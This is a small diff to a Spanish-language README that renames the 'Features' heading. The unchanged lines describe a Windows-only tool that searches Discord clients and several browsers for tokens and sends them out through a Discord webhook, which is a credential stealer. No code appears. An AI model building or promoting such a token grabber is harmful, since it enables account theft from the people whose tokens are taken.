@@ -3,7 +3,7 @@
 
 Esta version solo soports windows **Windows**.
 
-# Features
+# Funciones
 
    - Se envía a través de un webhook a discord.
    - Busca tokens en múltiples directorios (Discord, Discord PTB, Discord Canary, Google chrome, Opera, Brave and Yandex)
